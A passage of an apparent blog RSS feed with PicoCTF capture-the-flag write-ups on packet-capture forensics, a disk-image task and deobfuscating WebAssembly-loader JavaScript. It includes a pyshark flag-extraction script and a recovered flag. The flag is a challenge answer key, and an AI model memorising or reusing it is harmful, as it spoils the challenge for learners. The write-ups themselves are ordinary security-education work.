&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - shark on wire 1</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---shark-on-wire-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---shark-on-wire-1/</guid><description>&lt;h1 id="picoctf---shark-on-wire-1">
 PicoCTF - shark on wire 1
 &lt;a class="anchor" href="#picoctf---shark-on-wire-1">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/30?category=4&amp;amp;page=2">shark on wire 1&lt;/a>&lt;/p>
&lt;h2 id="exploit---analyze-udp-stream">
 Exploit - Analyze UDP stream
 &lt;a class="anchor" href="#exploit---analyze-udp-stream">#&lt;/a>
&lt;/h2>
&lt;p>It transfer the single character by UDP protocol.
&lt;img src="https://i.imgur.com/ff5CsGr.png" alt="" />
Follow the UDP stream and you&amp;rsquo;ll get the flag
&lt;img src="https://i.imgur.com/EfK83gj.png" alt="" />&lt;/p></description></item><item><title>PicoCTF - shark on wire 2</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---shark-on-wire-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---shark-on-wire-2/</guid><description>&lt;h1 id="picoctf---shark-on-wire-2">
 PicoCTF - shark on wire 2
 &lt;a class="anchor" href="#picoctf---shark-on-wire-2">#&lt;/a>
&lt;/h1>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一提出的很硬要，誰知道會把flag藏在這種地方，也沒有任何的提示，如果不是看&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>根本不知道這題要表達甚麼，也可能是我太蔡&lt;/p>
&lt;ol>
&lt;li>Simple Recon
首先做一些基本的recon，諸如dump files/string search/follow tcp or udp之類的，會發現UDP packets會有一些訊息出現，其中出現Start和一些a/b最後接著end
&lt;img src="https://hackmd.io/_uploads/rkASlUD02.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/BkxFgLPRn.png" alt="" />&lt;/li>
&lt;li>Set filter as &lt;code>udp.port==22&lt;/code>
會發現其中所有的len都一樣，就只有source port不一樣，同樣都是5xxx開頭，而後三位數就是flag
&lt;img src="https://hackmd.io/_uploads/BJq71UvC2.png" alt="" />&lt;/li>
&lt;li>Extract Flag
所以只要把所有的port擷取出來拚在一起，就可以拿到flag了&lt;/li>
&lt;/ol>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-python!" data-lang="python!">import pyshark

capture = pyshark.FileCapture(&amp;#39;./PicoCTF/Misc/shark on wire 2/capture.pcap&amp;#39;, display_filter=&amp;#39;udp.port == 22&amp;#39;)

data = []
for pkt in capture:
 if pkt.udp.port != &amp;#39;5000&amp;#39;:
 data.append(chr(int(pkt.udp.port[1:])))
print(&amp;#34;&amp;#34;.join(data))
&lt;/code>&lt;/pre>&lt;p>Flag: &lt;code>picoCTF{p1LLf3r3d_data_v1a_st3g0}&lt;/code>&lt;/p>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;div class="footnotes" role="doc-endnotes">
&lt;hr>
&lt;ol>
&lt;li id="fn:1">
&lt;p>&lt;a href="https://zomry1.github.io/shark-on-wire-2/">PicoCTF 2019 - shark on wire 2:-1:&lt;/a>&amp;#160;&lt;a href="#fnref:1" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p></description></item><item><title>PicoCTF - SideChannel</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/general/picoctf---sidechannel/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/general/picoctf---sidechannel/</guid><description>&lt;h1 id="picoctf---sidechannel">
 PicoCTF - SideChannel
 &lt;a class="anchor" href="#picoctf---sidechannel">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>There&amp;rsquo;s something fishy about this PIN-code checker, can you figure out the PIN and get the flag? Download the PIN checker program here pin_checker Once you&amp;rsquo;ve figured out the PIN (and gotten the checker program to accept it), connect to the master server using nc saturn.picoctf.net 50364 and provide it the PIN to get your flag.&lt;/p>
&lt;p>Hint 1: Read about &amp;ldquo;timing-based side-channel attacks.&amp;rdquo;
Hint 2: Attempting to reverse-engineer or exploit the binary won&amp;rsquo;t help you, you can figure out the PIN just by interacting with it and measuring certain properties about it.
Hint 3: Don&amp;rsquo;t run your attacks against the master server, it is secured against them. The PIN code you get from the pin_checker binary is the same as the one for the master server.&lt;/p></description></item><item><title>PicoCTF - Sleuthkit Intro</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/disk/picoctf---sleuthkit-intro/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/disk/picoctf---sleuthkit-intro/</guid><description>&lt;h1 id="picoctf---sleuthkit-intro">
 PicoCTF - Sleuthkit Intro
 &lt;a class="anchor" href="#picoctf---sleuthkit-intro">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/301?category=4&amp;amp;page=2">Sleuthkit Intro&lt;/a>&lt;/p>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>Download the disk image and use &lt;font color="FF0000">mmls&lt;/font> on it to find the size of the Linux partition. Connect to the remote checker service to check your answer and get the flag. Note: if you are using the webshell, download and extract the disk image into /tmp not your home directory.&lt;/p>&lt;/blockquote>
&lt;pre>&lt;code>Download disk image
Access checker program: nc saturn.picoctf.net 52279
&lt;/code>&lt;/pre>
&lt;p>&lt;a href="https://blog.csdn.net/qq_40399982/article/details/114882879?spm=1001.2014.3001.5506">最新kali之mmls&lt;/a>&lt;/p></description></item><item><title>PicoCTF - Some Assembly Required 1</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-1/</guid><description>&lt;h1 id="picoctf---some-assembly-required-1">
 PicoCTF - Some Assembly Required 1
 &lt;a class="anchor" href="#picoctf---some-assembly-required-1">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/152?category=1&amp;amp;page=1">Some Assembly Required 1&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://blog.techbridge.cc/2017/06/17/webassembly-js-future/">了解 WebAssembly 的基礎使用方法&lt;/a>&lt;/p>
&lt;h2 id="source-code---after-beautify">
 Source code - After &lt;a href="https://beautifier.io/">Beautify&lt;/a>
 &lt;a class="anchor" href="#source-code---after-beautify">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-javascript=" data-lang="javascript=">const strings = [&amp;#39;value&amp;#39;, &amp;#39;2wfTpTR&amp;#39;, &amp;#39;instantiate&amp;#39;, &amp;#39;275341bEPcme&amp;#39;, &amp;#39;innerHTML&amp;#39;, &amp;#39;1195047NznhZg&amp;#39;, &amp;#39;1qfevql&amp;#39;, &amp;#39;input&amp;#39;, &amp;#39;1699808QuoWhA&amp;#39;, &amp;#39;Correct!&amp;#39;, &amp;#39;check_flag&amp;#39;, &amp;#39;Incorrect!&amp;#39;, &amp;#39;./JIFxzHyW8W&amp;#39;, &amp;#39;23SMpAuA&amp;#39;, &amp;#39;802698XOMSrr&amp;#39;, &amp;#39;charCodeAt&amp;#39;, &amp;#39;474547vVoGDO&amp;#39;, &amp;#39;getElementById&amp;#39;, &amp;#39;instance&amp;#39;, &amp;#39;copy_char&amp;#39;, &amp;#39;43591XxcWUl&amp;#39;, &amp;#39;504454llVtzW&amp;#39;, &amp;#39;arrayBuffer&amp;#39;, &amp;#39;2NIQmVj&amp;#39;, &amp;#39;result&amp;#39;];

const search_string1 = function(id1, _0x53c021) {
 id1 = id1 - 470;
 let strings6f = strings[id1];
 return strings6f;
};

(function(id1, id2) {
 const search_string = search_string1;
 while (!![]) {
 try {
 const secret_key = -parseInt(search_string(0x1eb)) + parseInt(search_string(0x1ed)) + -parseInt(search_string(0x1db)) * -parseInt(search_string(0x1d9)) + -parseInt(search_string(0x1e2)) * -parseInt(search_string(0x1e3)) + -parseInt(search_string(0x1de)) * parseInt(search_string(0x1e0)) + parseInt(search_string(0x1d8)) * parseInt(search_string(0x1ea)) + -parseInt(search_string(0x1e5));
 if (secret_key === id2) break;
 else id1[&amp;#39;push&amp;#39;](id1[&amp;#39;shift&amp;#39;]());
 } catch (_0x41d31a) {
 id1[&amp;#39;push&amp;#39;](id1[&amp;#39;shift&amp;#39;]());
 }
 }
}(strings, 627907));
let exports;
(async () =&amp;gt; {
 const search_string = search_string1;
 let _0x5f0229 = await fetch(search_string(489)),
 _0x1d99e9 = await WebAssembly[search_string(479)](await _0x5f0229[search_string(474)]()),
 _0x1f8628 = _0x1d99e9[search_string(470)];
 exports = _0x1f8628[&amp;#39;exports&amp;#39;];
})();

function onButtonPress() {
 const search_string = search_string1;
 let input_value = document[&amp;#39;getElementById&amp;#39;](search_string(484))[search_string(477)]; // document[&amp;#39;getElementById&amp;#39;](input)[value]
 for (let i = 0; i &amp;lt; input_value[&amp;#39;length&amp;#39;]; i++) {
 exports[search_string(471)](input_value[search_string(492)](i), i);
 }
 exports[&amp;#39;copy_char&amp;#39;](0, input_value[&amp;#39;length&amp;#39;]), exports[search_string(487)]() == 1 ? document[search_string(494)](search_string(0x1dc))[search_string(0x1e1)] = search_string(0x1e6) : document[search_string(0x1ee)](search_string(0x1dc))[search_string(0x1e1)] = search_string(0x1e8);
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Some Assembly Required 2</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-2/</guid><description>&lt;h1 id="picoctf---some-assembly-required-2">
 PicoCTF - Some Assembly Required 2
 &lt;a class="anchor" href="#picoctf---some-assembly-required-2">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler source&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">list_str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;copy_char&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;value&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;207aLjBod&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;1301420SaUSqf&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;233ZRpipt&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;2224QffgXU&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;check_flag&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;408533hsoVYx&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;instance&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;278338GVFUrH&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;Correct!&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;549933ZVjkwI&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;innerHTML&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;charCodeAt&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;./aD8SvhyVkb&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;result&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;977AzKzwq&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;Incorrect!&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;exports&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;length&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;getElementById&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;1jIrMBu&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;input&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;615361geljRK&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span>(&lt;span style="color:#a6e22e">var_a&lt;/span>, &lt;span style="color:#a6e22e">var_b&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">var_a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">var_a&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">195&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">list_strc4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">list_str&lt;/span>[&lt;span style="color:#a6e22e">var_a&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">list_strc4&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>(&lt;span style="color:#66d9ef">function&lt;/span>(&lt;span style="color:#a6e22e">var_a&lt;/span>, &lt;span style="color:#a6e22e">var_b&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> (&lt;span style="color:#f92672">!!&lt;/span>[]) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">var_c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">200&lt;/span>)) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#f92672">-&lt;/span>parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">201&lt;/span>)) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">205&lt;/span>)) &lt;span style="color:#f92672">+&lt;/span> parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">207&lt;/span>)) &lt;span style="color:#f92672">+&lt;/span> parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">195&lt;/span>)) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">198&lt;/span>)) &lt;span style="color:#f92672">*&lt;/span> parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">212&lt;/span>)) &lt;span style="color:#f92672">+&lt;/span> parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">203&lt;/span>)) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">217&lt;/span>)) &lt;span style="color:#f92672">*&lt;/span> parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">199&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">var_c&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#a6e22e">var_b&lt;/span>) &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#a6e22e">var_a&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;push&amp;#39;&lt;/span>](&lt;span style="color:#a6e22e">var_a&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;shift&amp;#39;&lt;/span>]());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (&lt;span style="color:#a6e22e">_0x4f8a&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">var_a&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;push&amp;#39;&lt;/span>](&lt;span style="color:#a6e22e">var_a&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;shift&amp;#39;&lt;/span>]());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}(&lt;span style="color:#a6e22e">list_str&lt;/span>, &lt;span style="color:#ae81ff">310022&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">exports&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>(&lt;span style="color:#66d9ef">async&lt;/span> () =&amp;gt; {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">res_1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">await&lt;/span> &lt;span style="color:#a6e22e">fetch&lt;/span>(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">210&lt;/span>)),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">res_2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">await&lt;/span> &lt;span style="color:#a6e22e">WebAssembly&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;instantiate&amp;#39;&lt;/span>](&lt;span style="color:#66d9ef">await&lt;/span> &lt;span style="color:#a6e22e">res_1&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;arrayBuffer&amp;#39;&lt;/span>]()),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">res_3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">res_2&lt;/span>[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">204&lt;/span>)];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">exports&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">res_3&lt;/span>[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">214&lt;/span>)];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>})();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">onButtonPress&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">res_1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> document[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">216&lt;/span>)](&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">218&lt;/span>))[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">197&lt;/span>)];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">idx&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; &lt;span style="color:#a6e22e">idx&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#a6e22e">res_1&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;length&amp;#39;&lt;/span>]; &lt;span style="color:#a6e22e">idx&lt;/span>&lt;span style="color:#f92672">++&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">exports&lt;/span>[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">196&lt;/span>)](&lt;span style="color:#a6e22e">res_1&lt;/span>[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">209&lt;/span>)](&lt;span style="color:#a6e22e">idx&lt;/span>), &lt;span style="color:#a6e22e">idx&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">exports&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;copy_char&amp;#39;&lt;/span>](&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#a6e22e">res_1&lt;/span>[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">215&lt;/span>)]), &lt;span style="color:#a6e22e">exports&lt;/span>[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">202&lt;/span>)]() &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">?&lt;/span> document[&lt;span style="color:#e6db74">&amp;#39;getElementById&amp;#39;&lt;/span>](&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">211&lt;/span>))[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">208&lt;/span>)] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">206&lt;/span>) &lt;span style="color:#f92672">:&lt;/span> document[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">216&lt;/span>)](&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">211&lt;/span>))[&lt;span style="color:#e6db74">&amp;#39;innerHTML&amp;#39;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">213&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Some Assembly Required 3</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-3/</guid><description>&lt;h1 id="picoctf---some-assembly-required-3">
 PicoCTF - Some Assembly Required 3
 &lt;a class="anchor" href="#picoctf---some-assembly-required-3">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://github.com/WebAssembly/wabt">WebAssembly/wabt&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ ./build/wasm2c qCCYI0ajpD.wasm -o dump.c
&lt;/code>&lt;/pre>&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler rTEuOmSfG3.js&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-javascript=" data-lang="javascript=">&amp;#39;use strict&amp;#39;;
const str_list = [&amp;#34;exports&amp;#34;, &amp;#34;270328ewawLo&amp;#34;, &amp;#34;instantiate&amp;#34;, &amp;#34;1OsuamQ&amp;#34;, &amp;#34;Incorrect!&amp;#34;, &amp;#34;length&amp;#34;, &amp;#34;copy_char&amp;#34;, &amp;#34;value&amp;#34;, &amp;#34;1512517ESezaM&amp;#34;, &amp;#34;innerHTML&amp;#34;, &amp;#34;check_flag&amp;#34;, &amp;#34;result&amp;#34;, &amp;#34;1383842SQRPPf&amp;#34;, &amp;#34;924408cukzgO&amp;#34;, &amp;#34;getElementById&amp;#34;, &amp;#34;418508cLDohp&amp;#34;, &amp;#34;input&amp;#34;, &amp;#34;Correct!&amp;#34;, &amp;#34;573XsMMHp&amp;#34;, &amp;#34;arrayBuffer&amp;#34;, &amp;#34;183RUQBDE&amp;#34;, &amp;#34;38934oMACea&amp;#34;];
const tranfer_fn = function(url, whensCollection) {
 /** @type {number} */
 url = url - 285;
 let _0x143f7d = str_list[url];
 return _0x143f7d;
};
(function(data, oldPassword) {
 const tranfer_fn = tranfer_fn;
 for (; !![];) {
 try {
 const userPsd = -parseInt(&amp;#34;length&amp;#34;) + -parseInt(&amp;#34;573XsMMHp&amp;#34;) + -parseInt(&amp;#34;innerHTML&amp;#34;) * -parseInt(&amp;#34;getElementById&amp;#34;) + -parseInt(&amp;#34;38934oMACea&amp;#34;) + parseInt(&amp;#34;value&amp;#34;) + -parseInt(&amp;#34;Incorrect!&amp;#34;) * -parseInt(&amp;#34;instantiate&amp;#34;) + parseInt(&amp;#34;arrayBuffer&amp;#34;);
 if (userPsd === oldPassword) {
 break;
 } else {
 data[&amp;#34;push&amp;#34;](data[&amp;#34;shift&amp;#34;]());
 }
 } catch (_0x289152) {
 data[&amp;#34;push&amp;#34;](data[&amp;#34;shift&amp;#34;]());
 }
 }
})(str_list, 970828);
let exports;
(async() =&amp;gt; {
 const tranfer_fn = tranfer_fn;
 let rpm_traffic = await fetch(&amp;#34;./qCCYI0ajpD&amp;#34;);
